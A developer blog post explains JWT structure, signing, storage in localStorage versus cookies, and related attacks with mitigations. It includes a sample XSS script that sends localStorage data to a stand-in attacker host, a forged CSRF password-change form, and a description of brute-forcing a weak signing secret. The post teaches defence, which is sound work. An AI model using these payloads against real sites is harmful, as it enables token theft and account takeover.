+++
title = "All about JWT"
date = "2019-03-15T05:59:53Z"
tags = ["jwt","token"]
draft = false
author = "admin"

+++

## JWT

[RFC7519](https://tools.ietf.org/html/rfc7519) states:

JSON Web Token (JWT) is a compact, URL-safe means of representing
claims to be transferred between two parties. The claims in a JWT
are encoded as a JSON object that is used as the payload of a JSON
Web Signature (JWS) structure or as the plaintext of a JSON Web
Encryption (JWE) structure, enabling the claims to be digitally
signed or integrity protected with a Message Authentication Code
(MAC) and/or encrypted.

JWT has json structure when decoded which is well know by every web developer and contains minimal information required by frontend or client side to work on.

- JWT is an open standard
- JWTs can be signed using a secret (with the HMAC algorithm) or a public/private key pair using RSA or ECDSA.
- Does not require database

### JSON Web Token structure

While transmitting JWT its base64 encoded with 3 strings separated by "."

    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiTUpUIiwiZ3JvdXBzIjpbXSwiZXhwIjoyMTMxMn0.qjUIVhO5XntQnWq_Au9BTUrM1ArBvfXyzY8PU7B2K1w

let's separate these 3 parts and decode each

    //javascript
    var string = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiTUpUIiwiZ3JvdXBzIjpbXSwiZXhwIjoyMTMxMn0.qjUIVhO5XntQnWq_Au9BTUrM1ArBvfXyzY8PU7B2K1w";
    var arr = string.split(".");

    var header = atob(arr[0]);
    // "{"alg":"HS256","typ":"JWT"}"

    var payload = atob(arr[1]);
    // "{"name":"MJT","groups":[],"exp":21312}"

    var signature = atob(arr[2]);
    //error decoding

- header : it contains information about algorithm used while creating this JWT
- payload : it contains information that can be used by server or client side or different parties.
  
Common payload


    {
        iss: "api.mjt.com.np", //issuer
        user: "emp3ror", //username
        exp : 1552622839, //expiry time
        grp : [] //groups or actions or ....
    }
    

Since its json token, more information can be added but we need to keep in mind that it is transferred with each request so it does use bandwidth

- Signature : Its where takon is validated. It cannot be just decode with base64 :D 

It is encrypted as below


    HMACSHA256(
        base64UrlEncode(header) + "." +
        base64UrlEncode(payload),
        secret)

    // here HMACSHA256 algorithm is used to encrypt 
    and secret is key (string)


#### How validation works with JWT
Everytime Payload changes, it changes the signature String. 

    function greatSignatureReturns (header,payload, secret) {
        return HMACSHA256(
            base64UrlEncode(header) + "." +
            base64UrlEncode(payload),
            secret)
    }

So if we pass header, payload and our the SECRET keyword hidden somewhere in Server universe to "greatSignatureReturns" function, it returns the signature. We can validate this signature returned from function with that obtained from JWT, easy right?

To create Signature it needs Secret code that has been used to create Signature originally. If Payload is tempered but doesnt have SECRET, then it will be easily caught. Below, I have written how to [get secret key from JWT, and make it more secure.](#accessUnauthorizedKey)

## Storing JWT
JWT doesn't need to be stored in the server Unlike sessions. Obviously it needs to be stored in client side dahhhh :D

We have two options to store JWT in client side

#### Using browser storage
Modern browser provides API ([localStorage](https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage) or [sessionStorage](https://developer.mozilla.org/en-US/docs/Web/API/Window/sessionStorage) ) specific to the protocol of the domain. Its a key value pair, easy to use like below

    window.localStorage.jwt = JWT;
    localStorage.setItem('myCat', 'Tom');

Everytime we send API request, we send this JWT stored in localStorage via HEADERS or FORMs.

Storing in browser makes web app stateless but if this JWT is stolen or shared,  Unintended user can access the data.

Stealing localstorage data is easy with XSS attack. Suppose we have a form that takes the input and rendered that input on ours Users browser. Say a hero hacker input a javascript  such as below into our input form

    <script>
        var data = window.localStorage();
        // Set up our HTTP request
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'https://herohacker.io/localstorage?data='+data);
        xhr.send();
    </script>

If this code in rendered in HTML of any other user, the hero Hacker can get JWT and access our Wonderful Web App as this user.

This `XSS attack` can be easily prevented while storing this data by checking HTML entities and removing them, also thought its checked while storing data, we need to cross check while rendering in Client side and use something like Trusted source only to render

#### Using Cookie
Traditional storage, we always love :D may think it as not stateless. While using [cookie](https://en.wikipedia.org/wiki/HTTP_cookie), server can create cookie

To avoid `XSS attack`, we can use `HttpOnly` cookie, this way cookie can't be accessed by javascript. But doing this, I think it violets purpose of JWT, the payload will be useless.

With Cookie, we do have forever green `CSRF attack`. 

lets say, on my valueable website, I have form for logged In user to change password

    <form method="POST" action="http://mjt.com.np/form">
        username : <input name="user">
        change password : <input type="password" name="pass1">
        retype password : <input type="password" name="pass2">
        <input type="submit" value="submit">
    </form>

Now another Hero hacker using my website, viewed page source of my webpage and copied above component made new url say... xyztheherohacker.com

    //in xyztheherohacker.com/view-who-loves-you
    <form method="POST" action="http://mjt.com.np/form">
        <div> Submit below to know who loves you </div>
        Your username : <input name="user">
        <input type="hidden" name="pass1" value="youIdiot">
        <input type="hidden" name="pass2" value="youIdiot">
        <input type="submit" value="submit">
    </form>

and send this link to my users, by means like messagers, game request.. If the user opens this and type submit, password reset since all cookies will be pass with this site.

To avoide this. we can add extra token than our javascript will add to form or header will sending the request. 

    // JWT payload can be
    {
        ss: "api.mjt.com.np", //issuer
        user: "emp3ror", //username
        exp : 1552622839, //expiry time
        grp : [], //groups or actions or 
        XcrsfToken : "a good token"
    }

We can take this `XcrsfToken` toke with javascript and send by adding to form or header. This can't be done while using `HttpOnly` cookie as it can't be accessed by javascript.

- Note, Also this can be done by using extra request to api to get `XcrsfToken`
  

## <a name="accessUnauthorizedKey">Unauthorized accessing Secret key of JWT</a>

JWT token will be easily accessed by client so, it can be further processed without reaching to server to obtained `Secret key`

    var jwtToken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiTUpUIiwiZ3JvdXBzIjpbXSwiZXhwIjoyMTMxMn0.qjUIVhO5XntQnWq_Au9BTUrM1ArBvfXyzY8PU7B2K1w";

Lets use this above `jwtToken`, now lets use `bruteforce attack`, a brute-force attack consists of an attacker submitting many passwords or passphrases with the hope of eventually guessing correctly. 

Remember the function creating the signature?

    // function that create signature, the third part of jwt
    function greatSignatureReturns (header,payload, secret) {
        return HMACSHA256(
            base64UrlEncode(header) + "." +
            base64UrlEncode(payload),
            secret)
    }


With some dictionary passing to the function, secret key of above `jwtToken` can be easily obtained as I used `secret` as secret key.

There are many ways to do `bruteforce attack`. you can use [John the Ripper](https://en.wikipedia.org/wiki/John_the_Ripper) or any other.

#### Solution
Making the Secret key `large`, not using `common words` and also not using known `most used password` are the solution I know at the moment against `bruteforce attack`, may edit this page later :P

With speed of 1,000,000,000 Passwords/sec, cracking a 8 character password composed using 96 characters takes 83.5 days.

Key, 11 characters long has 542,950,367,897,600 combinations. It takes 10,534.62 hours or 438.94 days to crack key on computer that tries 25,769,803,776 keys per hour.
[More](https://web.archive.org/web/20180412051235/http://www.lockdown.co.uk/?pg=combi&s=articles)

So using longer Secret key with alphanumeric seems safe to be used with JWT

After writing this post, I did change some of my SECRET key used to create tokens :P

Another way might be using different secret for different user, does this avoids stateless nature of JWT?


Well, Here are few of the things I experienced with `JWT`, anything to add up, please mention it in the comment below 